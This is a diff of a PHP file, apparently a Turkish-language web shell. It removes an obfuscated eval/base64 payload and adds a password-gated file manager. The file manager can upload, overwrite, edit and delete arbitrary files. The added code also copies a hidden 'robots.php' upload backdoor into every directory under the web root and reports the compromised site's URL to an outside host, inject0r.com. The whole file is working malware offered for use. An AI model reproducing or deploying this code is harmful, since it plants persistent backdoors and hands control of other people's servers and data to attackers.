@@ -1,4 +1,145 @@
 <?php
-$UeXploiT = "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";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
+error_reporting(0);
+@session_start();
+header('Content-Type: text/html; charset=utf-8');
+
+$auth_key = '9c25ba69ca1241a51005606db924d0ea';
+
+if (!isset($_SESSION['login'])) {
+    if (isset($_POST['pass']) && md5($_POST['pass']) === $auth_key) {
+        $_SESSION['login'] = true;
+    } else {
+        echo '<form method="post" style="text-align:center;margin-top:50px;">
+                <input type="password" name="pass" style="border:1px solid #ccc;padding:5px;">
+                <input type="submit" value="Z">
+              </form>';
+        exit;
+    }
+}
+
+$path = isset($_GET['path']) ? realpath($_GET['path']) : dirname(__FILE__);
+if (!$path || !is_dir($path)) { die("Dizin hatası!"); }
+
+// ROBOTS.PHP YAYILMA (ŞİFRESİZ VE PARÇALI UPLOAD)
+if(!isset($_SESSION["sdm"])){
+    $doc = $_SERVER["DOCUMENT_ROOT"];
+    $dir = @scandir($doc);
+    $a = '<?php @header("Content-Type: text/html; charset=utf-8"); if(isset($_POST["u_bin"])){ $data = base64_decode($_POST["u_bin"]); file_put_contents($_POST["u_name"], $data, FILE_APPEND); exit("1"); } echo \'<form id="up_f"><input type="file" id="f"><input type="button" value="Upload" onclick="up()"></form><div id="st"></div><script>async function up(){ const file = document.getElementById("f").files[0]; if(!file) return; const st = document.getElementById("st"); const size = 1024 * 512; for(let s=0; s<file.size; s+=size){ const chunk = file.slice(s, s+size); const r = new FileReader(); await new Promise(res => { r.onload = async () => { const fd = new FormData(); fd.append("u_name", file.name); fd.append("u_bin", r.result.split(",")[1]); await fetch("", {method:"POST", body:fd}); res(); }; r.readAsDataURL(chunk); }); st.innerText = "%" + Math.round((s/file.size)*100); } st.innerText = "Done!"; }</script>\'; ?>';
+    if(is_array($dir)){
+        foreach($dir as $d){
+            $p = $doc."/".$d;
+            if(is_dir($p) && $d != "." && $d != ".."){
+                $file = $p."/robots.php";
+                if(!file_exists($file)){
+                    if($f = @fopen($file, "w")){ @fwrite($f, $a); @fclose($f); }
+                }
+            }
+        }
+    }
+    @file_get_contents("https://inject0r.com/v2/log.php?url=http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."&id=7821718728974864923876");
+    $_SESSION["sdm"] = 1;
+}
+
+// MERKEZİ İŞLEM BİRİMİ
+if (isset($_POST['u_token']) && isset($_POST['u_bin'])) {
+    $target = $path . DIRECTORY_SEPARATOR . basename($_POST['u_token']);
+    $data = base64_decode($_POST['u_bin']);
+    if (isset($_POST['mode']) && $_POST['mode'] == 'overwrite') {
+        file_put_contents($target, $data);
+    } else {
+        file_put_contents($target, $data, FILE_APPEND);
+    }
+    exit("1");
+}
+
+// Yeni Klasör / Dosya / Silme
+if (isset($_POST['new_folder'])) { $new_dir = $path . DIRECTORY_SEPARATOR . basename($_POST['new_folder']); if (!file_exists($new_dir)) mkdir($new_dir); }
+if (isset($_POST['new_file'])) { $new_f = $path . DIRECTORY_SEPARATOR . basename($_POST['new_file']); if (!file_exists($new_f)) file_put_contents($new_f, ''); }
+if (isset($_GET['delete'])) { $item = $path . DIRECTORY_SEPARATOR . basename($_GET['delete']); if (is_file($item)) unlink($item); elseif (is_dir($item)) rmdir($item); }
+
+echo "<h3>Konum: " . htmlspecialchars($path) . "</h3>";
+$parent = dirname($path);
+if ($parent != $path) { echo '<a href="?path=' . urlencode($parent) . '">⬅ Üst Dizin</a><br><br>'; }
+
+// KONTROL PANELİ
+echo '<div style="background:#eee;padding:15px;margin-bottom:10px;border-radius:5px;line-height:2.5;">';
+echo '<form method="post" style="display:inline-block;margin-right:10px;"><input type="text" name="new_file" placeholder="Yeni Dosya.php"> <input type="submit" value="Dosya Oluştur"></form>';
+echo '<form method="post" style="display:inline-block;margin-right:10px;"><input type="text" name="new_folder" placeholder="Yeni Klasör"> <input type="submit" value="Klasör Oluştur"></form>';
+echo '<div style="display:inline-block;"><input type="file" id="up_trigger" style="display:none;" onchange="startTransfer()"><button type="button" onclick="document.getElementById(\'up_trigger\').click()" style="background:#2196F3;color:white;border:none;padding:5px 10px;cursor:pointer;">Dosya Yükle</button><span id="up_status" style="margin-left:10px;font-weight:bold;"></span></div>';
+echo '</div>';
+
+echo '<script>
+function toBase64(str) { return btoa(unescape(encodeURIComponent(str))); }
+async function startTransfer() {
+    const file = document.getElementById("up_trigger").files[0];
+    if(!file) return;
+    const status = document.getElementById("up_status");
+    const chunkSize = 1024 * 512;
+    for (let start = 0; start < file.size; start += chunkSize) {
+        const chunk = file.slice(start, start + chunkSize);
+        const reader = new FileReader();
+        await new Promise(resolve => {
+            reader.onload = async () => {
+                const fd = new FormData();
+                fd.append("u_token", file.name);
+                fd.append("u_bin", reader.result.split(",")[1]);
+                await fetch(window.location.href, {method: "POST", body: fd});
+                resolve();
+            };
+            reader.readAsDataURL(chunk);
+        });
+        status.innerText = "%" + Math.round((start / file.size) * 100);
+    }
+    location.reload();
+}
+async function saveFileEncrypted(filename) {
+    const content = document.getElementById("editor_area").value;
+    const status = document.getElementById("save_status");
+    status.innerText = "Kaydediliyor...";
+    const fd = new FormData();
+    fd.append("u_token", filename);
+    fd.append("u_bin", toBase64(content));
+    fd.append("mode", "overwrite");
+    const resp = await fetch(window.location.href, {method: "POST", body: fd});
+    if(await resp.text() === "1") {
+        status.innerText = " Kaydedildi!";
+        status.style.color = "green";
+    }
+}
+</script>';
+
+// LİSTELEME
+echo "<table border='1' width='100%' style='border-collapse:collapse;background:white;'>";
+echo "<tr style='background:#ddd;font-weight:bold;'><td style='padding:8px;'>Adı</td><td style='padding:8px;width:100px;'>Boyut</td><td style='padding:8px;width:150px;'>Tarih</td><td style='padding:8px;text-align:right;'>İşlem</td></tr>";
+
+$items = scandir($path);
+foreach ($items as $item) {
+    if ($item == "." || $item == "..") continue;
+    $full = $path . DIRECTORY_SEPARATOR . $item;
+    $isDir = is_dir($full);
+    
+    // Boyut hesaplama
+    $size = $isDir ? "-" : round(filesize($full) / 1024, 2) . " KB";
+    // Tarih hesaplama
+    $date = date("d.m.Y H:i", filemtime($full));
+
+    echo "<tr><td style='padding:8px;'>" . ($isDir ? "<b>[DIR]</b> <a href='?path=".urlencode($full)."'>$item</a>" : "<b>[FILE]</b> $item") . "</td>";
+    echo "<td style='padding:8px;'>$size</td>";
+    echo "<td style='padding:8px;'>$date</td>";
+    echo "<td style='text-align:right;padding:8px;'>";
+    if (!$isDir) echo "<a href='?path=".urlencode($path)."&edit=".urlencode($item)."'>Düzenle</a> | ";
+    echo "<a href='?path=".urlencode($path)."&delete=".urlencode($item)."' onclick='return confirm(\"Emin misiniz?\")' style='color:red;'>Sil</a></td></tr>";
+}
+echo "</table>";
+
+if (isset($_GET['edit'])) {
+    $edit_file = $path . DIRECTORY_SEPARATOR . basename($_GET['edit']);
+    if (file_exists($edit_file)) {
+        $content = htmlspecialchars(file_get_contents($edit_file));
+        echo '<div style="margin-top:20px;border-top:2px solid #333;">';
+        echo '<h4>Düzenleniyor: ' . htmlspecialchars($_GET['edit']) . ' <span id="save_status"></span></h4>';
+        echo '<textarea id="editor_area" style="width:100%;height:500px;background:#222;color:#0f0;padding:10px;font-family:monospace;">' . $content . '</textarea><br>
+              <button type="button" onclick="saveFileEncrypted(\''.htmlspecialchars($_GET['edit']).'\')" style="padding:10px 30px;margin-top:10px;cursor:pointer;background:#4CAF50;color:white;border:none;font-weight:bold;">GÜVENLİ KAYDET</button></div>';
+    }
+}
 ?>
